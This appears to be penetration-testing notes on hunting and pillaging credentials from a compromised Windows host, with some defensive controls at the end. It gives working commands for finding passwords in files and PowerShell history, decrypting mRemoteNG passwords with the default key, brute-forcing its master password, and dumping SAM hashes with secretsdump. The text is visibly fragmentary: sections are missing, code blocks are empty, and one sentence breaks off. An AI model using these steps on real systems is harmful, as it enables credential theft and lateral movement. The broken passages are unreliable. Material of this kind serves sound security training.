## Overview

Credential hunting and pillaging are the processes of searching a compromised Windows host for credentials, secrets, sensitive files, operational data, and access paths that can support privilege escalation, lateral movement, or objective completion.

This phase should be driven by situational awareness.

The general workflow is:

```text
Understand the host and user context
↓
Identify likely credential sources
↓
Search local files and user profiles
↓
Search application-specific locations
↓
Search Windows credential stores and registry locations
↓
Search browser, password manager, remote access, and messaging data
↓
Validate discovered credentials within scope
↓
Gain access as another user or to another service
↓
Repeat the process from the new context
```

> [!important]
> Credential hunting is iterative. Every time access changes, repeat the search. A file denied to one user may be readable by another user or by local admin.

# Core Mindset

## Search Based on Context

Do not search blindly.

Use situational awareness findings to decide what to check first.

Examples:

| Situational Awareness Finding | Credential Hunting Follow-Up |
|---|---|
| KeePass installed | Search for `.kdbx` databases |
| XAMPP installed | Search `C:\xampp` for `.ini`, `.txt`, and database configs |
| IIS running | Search for `web.config` files |
| MySQL running | Search for `my.ini`, `.sql`, app configs |
| FileZilla installed | Search saved FTP sessions |
| mRemoteNG installed | Search for `confCons.xml` |
| Chrome or Firefox installed | Review saved logins and cookies |
| RDP active | Check `cmdkey`, RDP files, active sessions |
| Backup software present | Search configs and backup repositories |
| PowerShell-heavy admin activity | Check PSReadLine history |
| Network shares accessible | Crawl for sensitive files |

# The Iterative Loop

Credential hunting should repeat after every access change.

```text
Current user
↓
Search accessible files and credential stores
↓
Find new credentials
↓
Check target user groups and access methods
↓
Access system or service as new user
↓
New permissions become available
↓
Repeat credential hunting
```

Example pattern:

```text
User dave can read meeting notes
↓
Meeting notes reveal steve's password
↓
steve can RDP to the host
↓
steve can read XAMPP my.ini
↓
my.ini reveals backupadmin password
↓
backupadmin is local administrator
```

# 5. Search File Contents for Password Strings

## findstr – Filenames Only

Start with filenames only to reduce output.

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

## findstr – Matching Lines

```cmd
findstr /si password *.xml *.ini *.txt *.config
```

## findstr – Recursive with Line Numbers

```cmd
findstr /spin "password" *.*
```

Flag breakdown:

| Flag | Purpose |
|---|---|
| `/S` | Search current directory and subdirectories |
| `/I` | Case-insensitive search |
| `/M` | Print matching filenames only |
| `/P` | Skip files with non-printable characters |
| `/N` | Print line numbers |
| `/C:"password"` | Search for literal phrase |

## PowerShell Select-String

```powershell
Select-String -Path C:\Users\<user>\Documents\*.txt -Pattern password
```

Multiple patterns:

```powershell
Get-ChildItem C:\Users\<user>\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern "password","passwd","pwd","secret","token","apikey","connectionString" -ErrorAction SilentlyContinue
```

# 13. PowerShell Exported Credentials

## Why Exported Credentials Matter

Admins may export credentials for automation using:

```powershell

```

These credentials are DPAPI-protected and usually decryptable only by:


```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.clixml -Recurse -ErrorAction SilentlyContinue
```


Retrieve username:

```powershell

```

Retrieve password:

```powershell
$credential.GetNetworkCredential().password
```

Look for scripts containing:

```text
Import-Clixml
Export-Clixml
GetNetworkCredential()

New-Object System.Management.Automation.PSCredential
```

# 23. mRemoteNG

## Why mRemoteNG Matters

mRemoteNG manages connections for:

- RDP
- SSH
- VNC
- Telnet
- rlogin
- raw sockets

Configuration file:

```text
%USERPROFILE%\AppData\Roaming\mRemoteNG\confCons.xml
```

List config directory:

```powershell
ls C:\Users\<user>\AppData\Roaming\mRemoteNG
```

Important file:

```text
confCons.xml
```

Useful XML attributes:

| Attribute | Meaning |
|---|---|
| `Username` | Saved username |
| `Domain` | Saved domain |
| `Password` | Encrypted password |
| `Hostname` | Remote host |
| `Protocol` | RDP, SSH, VNC, etc. |
| `Port` | Remote service port |
| `Protected` | Master password metadata |

Default master password:

```text
mR3m
```

Decrypt saved password:

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>"
```

Decrypt with custom master password:

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p "<master_password>"
```

Crack with wordlist loop:

```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $password 2>/dev/null;done
```

Error indicating wrong master password:

```text
ValueError: MAC check failed
```

Virtual disk files may contain full system backups.

Interesting extensions:

```text
.vhd
.vhdx
.vmdk
```

Search:

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -ErrorAction SilentlyContinue
```

Potential contents:

```text
SAM
SYSTEM
SECURITY
NTDS.dit
SSH keys
web.config
database files
user profiles
browser data
application configs
```

Registry hive paths on mounted Windows disks:

```text
Windows\System32\Config\SAM
Windows\System32\Config\SYSTEM
Windows\System32\Config\SECURITY
```

Extract local hashes with Impacket:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

# 32. Backup Systems and Repositories

## Why Backups Matter

Backup systems may contain copies of:

- protected files
- registry hives
- databases
- web roots
- old configuration files
- user profiles
- secrets deleted from live systems

Backup repositories are high-value pillaging targets.

## restic Examples

Initialize repository:

```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

Set repository password:

```powershell
$env:RESTIC_PASSWORD = 'Password'
```

Back up directory:

```powershell
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

Back up protected files with VSS:

```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

List snapshots:

```powershell
restic.exe -r E:\restic2\ snapshots
```

Restore snapshot:

```powershell
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

After restore, search restored data for:

```text
registry hives
config files
SSH keys
database files
web application secrets
browser data
PowerShell history
password databases
```

# 33. Other High-Value Files and Paths

Review where accessible:

```text
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

Why they matter:

| Path | Reason |
|---|---|
| `pagefile.sys` | May contain memory remnants |
| `NetSetup.log` | Domain join/setup information |
| `repair\sam`, `repair\system` | Old registry hive backups |
| `CCM\logs` | SCCM/deployment secrets |
| `ntuser.dat` | User registry hive |
| `hosts` | Internal host mappings |
| `ProgramData\Configs` | Application configs |
| PowerShell directories | Scripts and modules |

# 34. Validate Discovered Credentials

When you find a password, do not assume its only use is the file it came from.

Check:

```text
local user accounts
RDP
WinRM
SMB
database logins
web applications
VPN
SSH
remote access tools
service accounts
domain accounts
```

## Check Local User Details

```cmd
net user <username>
```

Look for:

```text
Local Group Memberships
Last logon
Account active
Password last set
```

## Access Method Decision

| Finding | Try |
|---|---|
| User in `Remote Desktop Users` | RDP |
| User in `Remote Management Users` | WinRM |
| User in `Administrators` | Admin access / remote execution |
| Saved `cmdkey` credential | RDP or `runas /savecred` |
| Database credential | MySQL/MSSQL client |
| SSH key or password | SSH |
| Web credentials | Login portal |
| Backup credentials | Backup repository access |

# Troubleshooting

## Search Returns Too Much Output

Start with filenames only:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Then inspect files manually.

---

## Access Denied

Document the path and retry after:

- switching user
- gaining local admin
- using backup privileges
- accessing a restored backup
- mounting a virtual disk

---

## PowerShell Is Restricted

Use CMD equivalents:

```cmd
dir /S /B
where /R
findstr
type
reg query
cmdkey /list
net user
net localgroup
```

---

## LaZagne or SharpChrome Gets Blocked

Use manual checks first:

```text
PowerShell history
registry keys
application config files
browser profile files
remote access config files
```

Then decide whether tool execution is worth the risk and within scope.

---

## Found Password Does Not Work

Try:

- different username casing
- local machine prefix: `HOST\user`
- domain prefix: `DOMAIN\user`
- related users
- local services
- web applications
- databases
- RDP
- WinRM
- SSH
- VPN
- password reuse on similar accounts

# Defensive Notes

## Common Causes

Credentials are exposed through:

- cleartext configuration files
- scripts created for convenience
- copied deployment answer files
- PowerShell history retention
- passwords passed on command lines
- saved browser passwords
- saved browser cookies
- weak password manager master passwords
- saved RDP credentials
- remote connection managers
- Sticky Notes
- overly permissive file shares
- backup repositories
- virtual disk backups
- AutoLogon registry values
- PuTTY proxy credentials
- saved WiFi keys
- password reuse

---

# Defensive Controls

Organizations should:

- avoid storing plaintext passwords in config files
- use managed service accounts where possible
- restrict access to configuration files
- remove unattended installation files after deployment
- disable or manage PowerShell history where appropriate
- prevent credentials from being passed on command lines
- use secure secret vaults
- enforce strong master passwords and MFA for vaults
- disable browser password storage for privileged accounts
- restrict saved credentials where possible
- audit PuTTY and remote access tool sessions
- restrict permissions on home folders and shares
- remove broad `Domain Users` read access where inappropriate
- scan shares for secrets regularly
- protect backup repositories with strong passwords
- restrict backup restore access
- monitor browser cookie database access
- require re-authentication for sensitive cloud applications
- restrict clipboard redirection in RDP where appropriate
- rotate exposed credentials
- monitor for secret patterns in repositories and scripts

---

# Key Takeaways

- Credential hunting should be guided by situational awareness.
- Start with user directories, application configs, and obvious file types.
- Installed applications provide strong clues about where secrets may live.
- PowerShell history frequently exposes credentials typed during administration.
- Exported PowerShell credentials may be decrypted by the same user on the same host.
- KeePass databases can be cracked offline if protected by weak master passwords.
- Sticky Notes stores data in `plum.sqlite` and related WAL files.
- `cmdkey /list` may reveal saved credentials for remote targets.
- `runas /savecred` can execute commands using stored credentials.
- Browser credentials and cookies can expose access to high-value applications.
- SessionGopher and LaZagne are powerful but may be detected.
- mRemoteNG stores connection data in `confCons.xml`.
- AutoLogon may expose cleartext passwords in the registry.
- Network shares and backups are high-value sources for sensitive data.
- Every new user context should trigger a new round of credential hunting.
- Found passwords should be tested carefully across likely users and services within scope.
